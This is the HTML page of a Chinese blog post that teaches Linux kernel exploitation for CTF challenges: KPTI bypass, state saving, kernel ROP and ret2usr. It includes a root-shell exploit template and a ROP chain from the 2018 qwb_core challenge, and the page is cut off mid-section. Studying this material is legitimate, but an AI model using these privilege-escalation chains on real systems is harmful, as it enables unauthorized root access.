@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="ROP with KPTI bypass
+KPTI 即 内核页表隔离（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/linux/rop/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/linux/rop/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#rop-with-kpti-bypass" aria-label="ROP with KPTI bypass">ROP with KPTI bypass</a></li>
+                    <li>
+                        <a href="#%e7%8a%b6%e6%80%81%e4%bf%9d%e5%ad%98%e4%b8%8e%e6%81%a2%e5%a4%8d" aria-label="状态保存与恢复">状态保存与恢复</a><ul>
+                            
+                    <li>
+                        <a href="#basic" aria-label="basic">basic</a></li>
+                    <li>
+                        <a href="#with-kpti" aria-label="with kpti">with kpti</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#kpti%e6%9c%ba%e5%88%b6" aria-label="KPTI机制">KPTI机制</a></li>
+                    <li>
+                        <a href="#kernel-rop---basic" aria-label="kernel ROP - Basic">kernel ROP - Basic</a></li>
+                    <li>
+                        <a href="#kernel-rop---ret2usr" aria-label="kernel ROP - ret2usr">kernel ROP - ret2usr</a><ul>
+                            
+                    <li>
+                        <a href="#smep--smap-bypass" aria-label="smep &amp;&amp; smap bypass">smep &amp;&amp; smap bypass</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#pt_regs%e7%bb%93%e6%9e%84%e4%bd%93" aria-label="pt_regs结构体">pt_regs结构体</a></li>
+                    <li>
+                        <a href="#ret2dir" aria-label="ret2dir">ret2dir</a></li>
+                    <li>
+                        <a href="#%e6%9d%82%e8%b0%88" aria-label="杂谈">杂谈</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%88%90%e5%8a%9f%e6%89%a7%e8%a1%8c%e6%8f%90%e6%9d%83%e5%87%bd%e6%95%b0%e4%bd%86%e6%b2%a1%e6%9c%89root%e6%9d%83%e9%99%90" aria-label="成功执行提权函数但没有root权限">成功执行提权函数但没有root权限</a></li>
+                    <li>
+                        <a href="#gadgets%e5%af%bb%e6%89%be" aria-label="gadgets寻找">gadgets寻找</a></li>
+                    <li>
+                        <a href="#%e7%94%a8%e6%88%b7%e7%bb%84%e7%ae%a1%e7%90%86" aria-label="用户组管理">用户组管理</a></li>
+                    <li>
+                        <a href="#gdb%e8%b0%83%e8%af%95" aria-label="gdb调试">gdb调试</a></li>
+                    <li>
+                        <a href="#%e7%bc%96%e5%86%99gdb%e8%b0%83%e8%af%95%e8%84%9a%e6%9c%ac" aria-label="编写gdb调试脚本">编写gdb调试脚本</a></li>
+                    <li>
+                        <a href="#%e5%86%85%e6%a0%b8%e5%87%bd%e6%95%b0api%e8%ae%b0%e5%bd%95" aria-label="内核函数api记录">内核函数api记录</a></li>
+                    <li>
+                        <a href="#%e5%86%85%e6%a0%b8%e7%bb%93%e6%9e%84%e4%bd%93%e6%9f%a5%e7%9c%8b%e5%b7%a5%e5%85%b7pahole" aria-label="内核结构体查看工具：pahole">内核结构体查看工具：pahole</a></li>
+                    <li>
+                        <a href="#%e7%ac%ac%e4%b8%80%e4%b8%aaexp-2018_qwb_core" aria-label="第一个exp: 2018_qwb_core">第一个exp: 2018_qwb_core</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%be%8b%e9%a2%98-mini-lctf2022-kgadget" aria-label="例题 MINI-LCTF2022-kgadget">例题 MINI-LCTF2022-kgadget</a><ul>
+                            
+                    <li>
+                        <a href="#%e9%a2%98%e7%9b%ae%e5%88%86%e6%9e%90" aria-label="题目分析">题目分析</a></li>
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="利用思路">利用思路</a></li>
+                    <li>
+                        <a href="#exp" aria-label="exp">exp</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8-pt_regs-%e6%9e%84%e9%80%a0%e9%80%9a%e7%94%a8%e5%86%85%e6%a0%b8-rop" aria-label="利用 pt_regs 构造通用内核 ROP">利用 pt_regs 构造通用内核 ROP</a></li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="rop-with-kpti-bypass">ROP with KPTI bypass<a hidden class="anchor" aria-hidden="true" href="#rop-with-kpti-bypass">#</a></h2>
+<p><a href="https://www.kernel.org/doc/html/latest/x86/pti.html">KPTI</a> 即 内核页表隔离（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化。</p>
+<p>KPTI 的发明主要是用来修复一个史诗级别的 CPU 硬件漏洞：Meltdown。简单理解就是利用 CPU 流水线设计中（乱序执行与预测执行）的漏洞来获取到用户态无法访问的内核空间的数据，属于侧信道攻击的一种。</p>
+<p><strong>KPTI 同时还令内核页表中属于用户地址空间的部分不再拥有执行权限，这使得 ret2usr 彻底成为过去式</strong> 。</p>
+<p>对于开启了 KPTI（内核页表隔离），我们<strong>不能像之前那样直接 swapgs ; iret 返回用户态</strong>，而是在返回用户态之前还<strong>需要将用户进程的页表给切换回来</strong> 。</p>
+<p>众所周知 Linux 采用<strong>四级页表</strong>结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页 4k，总计 8k，内核空间的在低地址，用户空间的在高地址），这样<strong>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</strong></p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/kpti-cr3.png" style="max-width: 100%; height: auto;"></p>
+<p>需要进行说明的是，<strong>在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，但两张页表都有着对用户内存空间的完整映射</strong>，如下图所示，左侧是未开启 KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局。</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/kpti.png" style="max-width: 100%; height: auto;"></p>
+<p><strong>KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得 ret2usr 彻底成为过去式</strong> 。</p>
+<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在 <code>arch/x86/entry/entry_64.S</code> 中提供了一个用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在 <code>/proc/kallsyms</code> 中获得。</p>
+<p>由于源码的汇编代码编写较为繁重，我们可以通过 IDA 逆向的方式查看其基本汇编逻辑：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/swapgs-ida.png" style="max-width: 100%; height: auto;"></p>
+<p>在实际操作时前面的一些栈操作都可以跳过，直接从 <code>mov rdi, rsp</code> 开始，这个函数大概可以总结为如下操作：</p>
+<pre tabindex="0"><code>mov  rdi, cr3
+or rdi, 0x1000
+mov  cr3, rdi
+pop rax
+pop rdi
+swapgs
+iretq
+</code></pre><p>因此我们只需要布置出如下栈布局即可：</p>
+<pre tabindex="0"><code>↓   swapgs_restore_regs_and_return_to_usermode
+    0 // padding
+    0 // padding
+    user_shell_addr
+    user_cs
+    user_rflags
+    user_sp
+    user_ss
+</code></pre><h2 id="状态保存与恢复">状态保存与恢复<a hidden class="anchor" aria-hidden="true" href="#状态保存与恢复">#</a></h2>
+<h3 id="basic">basic<a hidden class="anchor" aria-hidden="true" href="#basic">#</a></h3>
+<p>归根到底，我们需要执行一个<code>commit_creds(prepare_kernel_cred(NULL))</code>，来让当前线程的<code>cred</code>结构体变为<code>init</code>进程的<code>cred</code>的拷贝从而获得<code>root</code>权限，并着陆到用户态起一个<code>shell</code>。（高版本改变权限的方式更为复杂，需要执行<code>commit_creds(prepare_kernel_cred(&amp;init_task))</code>或<code>commit_creds(&amp;init_cred)</code>）</p>
+<p>在我们的<code>exploit</code>进入内核态之前，我们需要保存用户态的各个寄存器的值，从而手动模拟用户态进入到内核态的过程。例如，我们可以通过如下方式来保存寄存器的值（使用这种内联汇编在<code>gcc</code>编译时需要指定<code>-masm=intel</code>）：</p>
+<pre tabindex="0"><code>size_t user_cs, user_ss, user_rflags, user_sp;
+void save_status()
+{
+    asm volatile (
+        &#34;mov user_cs, cs;&#34;
+        &#34;mov user_ss, ss;&#34;
+        &#34;mov user_sp, rsp;&#34;
+        &#34;pushf;&#34;
+        &#34;pop user_rflags;&#34;
+    );
+    puts(&#34;\033[34m\033[1m[*] Status has been saved.\033[0m&#34;);
+}
+</code></pre><p>而在我么能成功执行<code>commit_creds(prepare_kernel_cred(NULL))</code>后，我们又需要返回用户态并着陆起一个<code>shell</code>。返回用户态的方式分为两步即：</p>
+<ul>
+<li>通过<code>swapgs</code>恢复用户态<code>GS</code>寄存器</li>
+<li>通过<code>sysretq</code>或者<code>iretq</code>指令恢复到用户空间</li>
+</ul>
+<p>因此通过<code>swapgs; iretq</code>的方式就可以返回到用户态。</p>
+<p>例如，使用<code>ROP</code>时，我们可以让栈保存为如下状态来返回用户态：</p>
+<pre tabindex="0"><code>swapgs
+iretq
+user_shell_addr // the func that will be execute
+user_cs
+user_eflags // 64bit:user_rflags
+user_sp
+user_ss
+</code></pre><h3 id="with-kpti">with kpti<a hidden class="anchor" aria-hidden="true" href="#with-kpti">#</a></h3>
+<p><code>kpti</code>机制可以参考后文的介绍部分。</p>
+<p>若程序开启了<code>kpti</code>机制，那么我们甚至不能简单通过<code>swapgs; iretq</code>这样的方式来返回到用户态。在此之前，我们还需要将页表切换为用户页表，而这个操作只需要将<code>cr3</code>寄存器的第<code>13</code>位取反（用户态为高位）即可。实际上，有一个函数专门用于完成这个操作，即<code>swapgs_restore_regs_and_return_to_usermode</code>。该函数操作总结如下：</p>
+<pre tabindex="0"><code># 一些pop操作
+mov  rdi, cr3
+or rdi, 0x1000
+mov  cr3, rdi
+pop rax
+pop rdi
+swapgs
+iretq
+</code></pre><p>由上可知，我们可以直接通过该函数一气呵成地完成切换用户态页表和<code>swapgs; iretq</code>两个操作。因此，我们只需要将栈布局为如下形式即可：</p>
+<pre tabindex="0"><code>↓   swapgs_restore_regs_and_return_to_usermode + 27
+    0 // padding
+    0 // padding
+    user_shell_addr
+    user_cs
+    user_rflags
+    user_sp
+    user_ss
+</code></pre><p>一个板子如下：</p>
+<p>（注意，<code>gcc</code>需要通过<code>gcc exp.c -o exp -masm=intel -static</code>来编译该文件）</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+void info(const char *format, ...)
+{
+    va_list args;
+    va_start(args, format);
+    printf(&#34;%s&#34;, &#34;\033[34m\033[1m[*] &#34;);
+    vprintf(format, args);
+    printf(&#34;%s&#34;, &#34;\033[0m\n&#34;);
+}
+
+void success(const char *format, ...)
+{
+    va_list args;
+    va_start(args, format);
+    printf(&#34;%s&#34;, &#34;\033[32m\033[1m[+] &#34;);
+    vprintf(format, args);
+    printf(&#34;%s&#34;, &#34;\033[0m\n&#34;);
+}
+
+void error(const char *format, ...)
+{
+    va_list args;
+    va_start(args, format);
+    printf(&#34;%s&#34;, &#34;\033[31m\033[1m[x] &#34;);
+    vprintf(format, args);
+    printf(&#34;%s&#34;, &#34;\033[0m\n&#34;);
+}
+
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+void save_status()
+{
+    asm volatile (
+        &#34;mov user_cs, cs;&#34;
+        &#34;mov user_ss, ss;&#34;
+        &#34;mov user_sp, rsp;&#34;
+        &#34;pushf;&#34;
+        &#34;pop user_rflags;&#34;
+    );
+    info(&#34;Status has been saved.&#34;);
+}
+
+void get_root_shell(void)
+{
+    if(getuid()) {
+        error(&#34;Failed to get the root!&#34;);
+        exit(-1);
+    }
+
+    success(&#34;Successful to get the root. Execve root shell now...&#34;);
+    system(&#34;/bin/sh&#34;);
+}
+
+int main(){
+
+}
+</code></pre><p><code>vscode</code>中用户<code>json</code>代码片段如下：</p>
+<pre tabindex="0"><code>&#34;kernel&#34;:{
+    &#34;prefix&#34;:&#34;kernel&#34;,
+    &#34;body&#34;:[
+        &#34;#define _GNU_SOURCE&#34;,
+        &#34;#include &lt;stdio.h&gt;&#34;,
+        &#34;#include &lt;stdlib.h&gt;&#34;,
+        &#34;#include &lt;string.h&gt;&#34;,
+        &#34;#include &lt;unistd.h&gt;&#34;,
+        &#34;#include &lt;fcntl.h&gt;&#34;,
+        &#34;#include &lt;sys/types.h&gt;&#34;,
+        &#34;#include &lt;sys/ioctl.h&gt;&#34;,
+        &#34;#include &lt;stdarg.h&gt;&#34;,
+        &#34;#include &lt;sys/mman.h&gt;&#34;,
+        &#34;&#34;,
+        &#34;void info(const char *format, ...)&#34;,
+        &#34;{&#34;,
+        &#34;    va_list args;&#34;,
+        &#34;    va_start(args, format);&#34;,
+        &#34;    printf(\&#34;%s\&#34;, \&#34;\\033[34m\\033[1m[*] \&#34;);&#34;,
+        &#34;    vprintf(format, args);&#34;,
+        &#34;    printf(\&#34;%s\&#34;, \&#34;\\033[0m\\n\&#34;);&#34;,
+        &#34;}&#34;,
+        &#34;&#34;,
+        &#34;void success(const char *format, ...)&#34;,
+        &#34;{&#34;,
+        &#34;    va_list args;&#34;,
+        &#34;    va_start(args, format);&#34;,
+        &#34;    printf(\&#34;%s\&#34;, \&#34;\\033[32m\\033[1m[+] \&#34;);&#34;,
+        &#34;    vprintf(format, args);&#34;,
+        &#34;    printf(\&#34;%s\&#34;, \&#34;\\033[0m\\n\&#34;);&#34;,
+        &#34;}&#34;,
+        &#34;&#34;,
+        &#34;void error(const char *format, ...)&#34;,
+        &#34;{&#34;,
+        &#34;    va_list args;&#34;,
+        &#34;    va_start(args, format);&#34;,
+        &#34;    printf(\&#34;%s\&#34;, \&#34;\\033[31m\\033[1m[x] \&#34;);&#34;,
+        &#34;    vprintf(format, args);&#34;,
+        &#34;    printf(\&#34;%s\&#34;, \&#34;\\033[0m\\n\&#34;);&#34;,
+        &#34;}&#34;,
+        &#34;&#34;,
+        &#34;size_t commit_creds = 0, prepare_kernel_cred = 0;&#34;,
+        &#34;&#34;,
+        &#34;size_t user_cs, user_ss, user_rflags, user_sp;&#34;,
+        &#34;void save_status()&#34;,
+        &#34;{&#34;,
+        &#34;    asm volatile (&#34;,
+        &#34;        \&#34;mov user_cs, cs;\&#34;&#34;,
+        &#34;        \&#34;mov user_ss, ss;\&#34;&#34;,
+        &#34;        \&#34;mov user_sp, rsp;\&#34;&#34;,
+        &#34;        \&#34;pushf;\&#34;&#34;,
+        &#34;        \&#34;pop user_rflags;\&#34;&#34;,
+        &#34;    );&#34;,
+        &#34;    info(\&#34;Status has been saved.\&#34;);&#34;,
+        &#34;}&#34;,
+        &#34;&#34;,
+        &#34;void get_root_shell(void)&#34;,
+        &#34;{&#34;,
+        &#34;    if(getuid()) {&#34;,
+        &#34;        error(\&#34;Failed to get the root!\&#34;);&#34;,
+        &#34;        exit(-1);&#34;,
+        &#34;    }&#34;,
+        &#34;&#34;,
+        &#34;    success(\&#34;Successful to get the root. Execve root shell now...\&#34;);&#34;,
+        &#34;    system(\&#34;/bin/sh\&#34;);&#34;,
+        &#34;}&#34;,
+        &#34;&#34;,
+        &#34;int main(){&#34;,
+        &#34;&#34;,
+        &#34;&#34;,
+        &#34;&#34;,
+        &#34;}&#34;
+    ],
+    &#34;description&#34;: &#34;kernel snippets&#34;
+}
+</code></pre><h2 id="kpti机制">KPTI机制<a hidden class="anchor" aria-hidden="true" href="#kpti机制">#</a></h2>
+<p><code>KPTI</code>机制将内核页表和用户空间页表分开来实现隔离。这里摘录自<code>arttnba3</code>师傅的博客：</p>
+<p>众所周知 <code>Linux</code> 采用<strong>四级页表</strong>结构（<code>PGD-&gt;PUD-&gt;PMD-&gt;PTE</code>），而 <code>CR3</code> 控制寄存器用以存储当前的 <code>PGD</code> 的地址，因此在开启 <code>KPTI</code> 的情况下用户态与内核态之间的切换便涉及到 <code>CR3</code> 的切换，为了提高切换的速度，内核将内核空间的 <code>PGD</code> 与用户空间的 <code>PGD</code> 两张页全局目录表放在一段连续的内存中（两张表，一张一页<code>4k</code>，总计<code>8k</code>，内核空间的在低地址，用户空间的在高地址），这样<strong>只需要将 <code>CR3</code> 的第 <code>13</code> 位取反便能完成页表切换的操作</strong></p>
+<p><a href="https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/Rm8Ti9MpVUZ7fPK.png"><img alt="image.png" decoding="async" loading="lazy" src="https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/Rm8Ti9MpVUZ7fPK.png" style="max-width: 100%; height: auto;"></a></p>
+<p>需要进行说明的是，<strong>在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射</strong>，如下图所示，左侧是未开启 <code>KPTI</code> 后的页表布局，右侧是开启了 <code>KPTI</code> 后的页表布局</p>
+<p><strong><code>KPTI</code> 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（<code>NX</code>），这使得 <code>ret2usr</code> 彻底成为过去式</strong>。</p>
+<p><a href="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png"><img alt="image.png" decoding="async" loading="lazy" src="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png" style="max-width: 100%; height: auto;"></a></p>
+<p>image.png</p>
+<p>在 <code>64</code> 位下用户空间与内核空间都占 <code>128TB</code>，所以他们占用的页全局表项（<code>PGD</code>）的大小应当是相同的，图上没有体现出来，<strong>必定在某个节点上同时存在着完整的对用户空间与内核空间的映射</strong>，这个节点就是当 <code>CPU</code> 运行在内核态时</p>
+<p><strong>以上均摘录自<code>arttnba3</code>师傅的博客</strong>，总结得非常详细。笔者本人初学时一度有疑问，既然存在<code>KPTI</code>机制的绕过，为什么还说<code>ret2usr</code>成为过去式？因为<code>ret2usr</code>这样的一个做法更多的是先切换到用户态，再在用户态上来进行提权；而开启<code>KPTI</code>后，无论如何也要先进行<code>ROP</code>来进行页表的切换，因此绕过<code>kpti</code>返回到用户态后，更多地是直接在用户态起一个<code>shell</code>叭。</p>
+<h2 id="kernel-rop---basic">kernel ROP - Basic<a hidden class="anchor" aria-hidden="true" href="#kernel-rop---basic">#</a></h2>
+<p>如果不是对<code>kernel</code>存在敬畏，对于<code>kernel ROP</code>应该没有什么学习成本，因为和用户态下的<code>ROP</code>无本质区别。用户态下我们需要通过<code>system(&quot;/bin/sh&quot;)</code>来获得一个<code>shell</code>，而内核态下我们需要通过<code>commit_creds(prepare_kernel_cred(NULL))</code>来提权为<code>root</code>（是的，高版本还需要<code>commit_creds(prepare_kernel_cred(&amp;init_task))</code>或<code>commit_creds(&amp;init_cred)</code>））。</p>
+<p>例如，这是笔者在做<code>2018qwb_core</code>中的<code>ROP chain</code>：</p>
+<pre tabindex="0"><code>rop_chain[i++] = POP_RDI_RET + offset;
+rop_chain[i++] = 0;
+rop_chain[i++] = prepare_kernel_cred;
+rop_chain[i++] = POP_RCX_RET + offset;
+rop_chain[i++] = commit_creds;
+rop_chain[i++] = MOV_RDI_RAX_POP_RBP_JMP_RCX + offset;
+rop_chain[i++] = 0; // pop_rbp
+rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
+rop_chain[i++] = 0; // pop_fq
+rop_chain[i++] = IRETQ_RET + offset;
+rop_chain[i++] = (size_t)get_root_shell;
+rop_chain[i++] = user_cs;
+rop_chain[i++] = user_rflags;
+rop_chain[i++] = user_sp;
+rop_chain[i++] = user_ss;
+</code></pre><p>可谓是相当熟悉了。</p>
+<h2 id="kernel-rop---ret2usr">kernel ROP - ret2usr<a hidden class="anchor" aria-hidden="true" href="#kernel-rop---ret2usr">#</a></h2>
+<p><code>ret2usr</code>实际上仍然属于<code>ROP</code>（确信），但由于<code>kernel</code>题中我们可以自行编写用户态下运行的<code>C</code>语言程序，因此我们便可以通过用户态下的<code>C</code>语言程序来直接执行内核态下的函数<code>commit_creds(prepare_kernel_cred(NULL))</code>，这可以减少<code>ROP</code>链构造的成本（例如你至少不需要通过<code>pop rdi</code>这些<code>gadgets</code>来传参执行函数）</p>
+<p>例如，我们用户态下编写函数：</p>
+<pre tabindex="0"><code>void userland_root_shell(void){
+    void* (*prepare_kernel_cred_ptr)(void*) = (void*)prepare_kernel_cred;
+    int (*commit_creds_ptr)(void*) = (void*)commit_creds;
+    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
+}
